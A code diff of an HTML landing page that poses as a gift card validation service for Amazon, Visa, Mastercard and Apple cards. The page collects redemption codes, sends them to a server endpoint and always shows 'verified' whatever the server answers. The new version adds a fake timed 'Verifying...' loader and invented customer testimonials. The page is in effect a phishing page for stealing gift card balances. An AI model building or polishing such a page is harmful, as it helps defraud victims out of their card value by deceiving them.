@@ -10,23 +10,20 @@
 *{box-sizing:border-box}
 body{
   margin:0;
-  font-family:system-ui, -apple-system, sans-serif;
-  background:#f9fafb;
-  color:#111;
+  font-family:system-ui;
+  background:linear-gradient(to bottom,#f8fafc,#eef2ff);
 }
 
 /* NAV */
 .nav{
   display:flex;
   justify-content:space-between;
-  align-items:center;
   padding:20px 40px;
+  background:white;
   position:sticky;
   top:0;
-  background:rgba(255,255,255,0.8);
-  backdrop-filter:blur(10px);
 }
-.logo{font-weight:700;color:#4f46e5}
+.logo{color:#4f46e5;font-weight:bold}
 .nav button{
   background:#4f46e5;
   color:white;
@@ -37,7 +34,7 @@ body{
 
 /* HERO */
 .hero{
-  padding:100px 20px;
+  padding:90px 20px;
 }
 .hero-inner{
   max-width:1100px;
@@ -48,33 +45,27 @@ body{
 }
 .hero h1{
   font-size:48px;
-  line-height:1.2;
 }
 .hero p{
-  margin-top:15px;
   color:#555;
 }
 .hero button{
-  margin-top:25px;
-  padding:14px 22px;
+  margin-top:20px;
+  padding:14px 20px;
   background:#4f46e5;
   color:white;
   border:none;
   border-radius:10px;
 }
-
-/* FLOAT IMAGE */
 .hero img{
-  width:340px;
+  width:320px;
   animation:float 6s ease-in-out infinite;
 }
 @keyframes float{
-  0%{transform:translateY(0)}
-  50%{transform:translateY(-20px)}
-  100%{transform:translateY(0)}
+  50%{transform:translateY(-15px)}
 }
 
-/* SECTION */
+/* SECTIONS */
 .section{
   padding:80px 20px;
 }
@@ -84,47 +75,56 @@ body{
 }
 
 /* PROCESS */
-.grid{
+.process{
   display:grid;
   grid-template-columns:1fr 1fr;
   gap:40px;
 }
 .card{
   background:white;
-  padding:25px;
-  border-radius:14px;
-  box-shadow:0 10px 30px rgba(0,0,0,0.05);
+  padding:20px;
+  border-radius:12px;
+  box-shadow:0 10px 25px rgba(0,0,0,0.05);
 }
 
-/* CTA */
-.cta{
-  background:linear-gradient(90deg,#6d28d9,#4f46e5);
-  color:white;
-  text-align:center;
-  padding:80px 20px;
+/* TESTIMONIAL SLIDER */
+.slider{
+  overflow:hidden;
+  position:relative;
 }
-.cta button{
-  margin-top:20px;
-  padding:14px;
-  border:none;
-  border-radius:10px;
+.slider-track{
+  display:flex;
+  gap:20px;
+  animation:scroll 25s linear infinite;
+}
+.testimonial{
+  min-width:250px;
+  background:white;
+  padding:20px;
+  border-radius:12px;
+  box-shadow:0 10px 20px rgba(0,0,0,0.05);
+}
+@keyframes scroll{
+  0%{transform:translateX(0)}
+  100%{transform:translateX(-50%)}
 }
 
 /* FORM */
-.form-box{
+.container-form{
   background:white;
+  margin:60px auto;
   padding:25px;
-  border-radius:14px;
+  border-radius:15px;
+  width:90%;
   max-width:400px;
-  margin:auto;
   box-shadow:0 10px 30px rgba(0,0,0,0.08);
 }
 input,select{
   width:100%;
   padding:12px;
-  margin-top:10px;
+  margin-top:8px;
   border-radius:8px;
-  border:1px solid #ddd;
+  border:1px solid #cbd5e1;
 }
 button.main{
   margin-top:20px;
@@ -135,6 +135,18 @@ button.main{
   border:none;
   border-radius:10px;
 }
+
+/* LOADER */
+.loader{
+  border:4px solid #e2e8f0;
+  border-top:4px solid #4f46e5;
+  border-radius:50%;
+  width:35px;
+  height:35px;
+  margin:40px auto;
+  animation:spin 1s linear infinite;
+}
+@keyframes spin{100%{transform:rotate(360deg)}}
 
 /* MODAL */
 .modal{
@@ -156,27 +168,18 @@ button.main{
 /* SCROLL ANIMATION */
 .reveal{
   opacity:0;
-  transform:translateY(60px);
-  transition:all 0.8s cubic-bezier(.2,.8,.2,1);
+  transform:translateY(50px);
+  transition:all 0.8s ease;
 }
 .reveal.active{
   opacity:1;
   transform:translateY(0);
 }
-.delay-1{transition-delay:.1s}
-.delay-2{transition-delay:.2s}
-.delay-3{transition-delay:.3s}
-.delay-4{transition-delay:.4s}
 
 /* MOBILE */
 @media(max-width:768px){
-  .hero-inner{
-    flex-direction:column;
-    text-align:center;
-  }
-  .grid{
-    grid-template-columns:1fr;
-  }
+  .hero-inner{flex-direction:column;text-align:center}
+  .process{grid-template-columns:1fr}
 }
 </style>
 
@@ -195,85 +198,85 @@ button.main{
 
 <section class="hero">
   <div class="hero-inner">
-
-```
-<div>
-  <h1 class="reveal delay-1">Validate Your Gift Cards With Confidence</h1>
-  <p class="reveal delay-2">Fast, simple and secure validation in seconds.</p>
-  <button class="reveal delay-3" onclick="scrollToForm()">Verify Now</button>
-</div>
-
-<img class="reveal delay-4" src="https://i.imgur.com/6X4YQ9T.png">
-```
-
+    <div>
+      <h1 class="reveal">Validate Your Gift Cards With Confidence</h1>
+      <p class="reveal">Fast, secure and simple verification.</p>
+      <button class="reveal" onclick="scrollToForm()">Verify Now</button>
+    </div>
+    <img class="reveal" src="https://i.imgur.com/6X4YQ9T.png">
   </div>
 </section>
 
-<!-- FEATURES -->
+<!-- PROCESS -->
 
 <section class="section">
-  <div class="container grid">
+  <div class="container process">
+    <div class="card reveal"><h3>Enter Details</h3><p>Input your card info</p></div>
+    <div class="card reveal"><h3>Validation</h3><p>System checks instantly</p></div>
+    <div class="card reveal"><h3>Secure</h3><p>Your data stays safe</p></div>
+    <div class="card reveal"><h3>Result</h3><p>Get instant feedback</p></div>
+  </div>
+</section>
+
+<!-- TESTIMONIAL SLIDER -->
+
+<section class="section">
+  <div class="container slider reveal">
+    <div class="slider-track">
 
 ```
-<div class="card reveal delay-1">
-  <h3>Enter Card Details</h3>
-  <p>Provide your card information to begin validation.</p>
-</div>
+  <!-- duplicated for smooth loop -->
+  <div class="testimonial"><b>Emily</b><p>Saved me from a fake card</p></div>
+  <div class="testimonial"><b>James</b><p>Very fast and simple</p></div>
+  <div class="testimonial"><b>Olivia</b><p>Clean interface</p></div>
+  <div class="testimonial"><b>Liam</b><p>Works perfectly</p></div>
+  <div class="testimonial"><b>Noah</b><p>Highly recommend</p></div>
+  <div class="testimonial"><b>Ava</b><p>Great experience</p></div>
 
-<div class="card reveal delay-2">
-  <h3>Secure Validation</h3>
-  <p>Our system analyzes the data instantly.</p>
-</div>
+  <div class="testimonial"><b>Emily</b><p>Saved me from a fake card</p></div>
+  <div class="testimonial"><b>James</b><p>Very fast and simple</p></div>
+  <div class="testimonial"><b>Olivia</b><p>Clean interface</p></div>
+  <div class="testimonial"><b>Liam</b><p>Works perfectly</p></div>
+  <div class="testimonial"><b>Noah</b><p>Highly recommend</p></div>
+  <div class="testimonial"><b>Ava</b><p>Great experience</p></div>
 
-<div class="card reveal delay-3">
-  <h3>Instant Result</h3>
-  <p>Get a clear response immediately.</p>
-</div>
-
-<div class="card reveal delay-4">
-  <h3>Safe Process</h3>
-  <p>Your data stays private and secure.</p>
 </div>
 ```
 
   </div>
 </section>
 
-<!-- CTA -->
+<!-- FORM (YOUR ORIGINAL STRUCTURE KEPT SIMPLE) -->
 
-<section class="cta reveal">
-  <h2>Start Verifying Your Card Now</h2>
-  <button onclick="scrollToForm()">Get Started</button>
-</section>
+<div id="formSection" class="container-form">
+  <h2>Check Card Status</h2>
 
-<!-- FORM -->
+  <select id="cardType">
+    <option value="amazon">Amazon</option>
+    <option value="visa">Visa</option>
+    <option value="mastercard">Mastercard</option>
+    <option value="apple">Apple</option>
+  </select>
 
-<section class="section" id="formSection">
-  <div class="form-box reveal">
-    <h2>Check Card Status</h2>
-
-```
-<select id="cardType">
-  <option>Amazon</option>
-  <option>Visa</option>
-  <option>Mastercard</option>
-  <option>Apple</option>
-</select>
-
-<input id="amount" placeholder="Amount">
-<input id="code" placeholder="Redemption Code">
+  <input id="amount" placeholder="Amount">
+  <input id="code" placeholder="Redemption Code">
 
 <button class="main" onclick="goToVerify()">Check Status</button>
-```
 
-  </div>
-</section>
+</div>
+
+<!-- LOADER -->
+
+<div id="step2" style="display:none">
+  <h2 style="text-align:center;">Verifying...</h2>
+  <div class="loader"></div>
+</div>
 
 <!-- MODAL -->
 
 <div class="modal" id="modal">
   <div class="modal-box">
-    <h2>Success</h2>
+    <h2>SUCCESS</h2>
     <p id="message"></p>
     <button onclick="closeModal()">Close</button>
   </div>
@@ -285,21 +288,25 @@ function scrollToForm(){
 }
 
 async function goToVerify(){
+  document.getElementById("step2").style.display="block";
+
   await fetch("/api/verify",{
     method:"POST",
     headers:{ "Content-Type":"application/json" },
     body: JSON.stringify({ code: document.getElementById("code").value })
   });
 
-  document.getElementById("modal").style.display="flex";
-  document.getElementById("message").textContent="Card checked successfully.";
+  setTimeout(()=>{
+    document.getElementById("modal").style.display="flex";
+    document.getElementById("message").textContent="Your card has been verified.";
+  },1500);
 }
 
 function closeModal(){
   document.getElementById("modal").style.display="none";
 }
 
-/* SCROLL */
+/* SCROLL ANIMATION */
 const observer=new IntersectionObserver(entries=>{
   entries.forEach(e=>{
     if(e.isIntersecting){
@@ -308,7 +315,9 @@ const observer=new IntersectionObserver(entries=>{
   });
 },{threshold:0.2});
 
-document.querySelectorAll(".reveal").forEach(el=>observer.observe(el));
+document.querySelectorAll(".reveal").forEach(el=>{
+  observer.observe(el);
+});
 </script>
 
 </body>
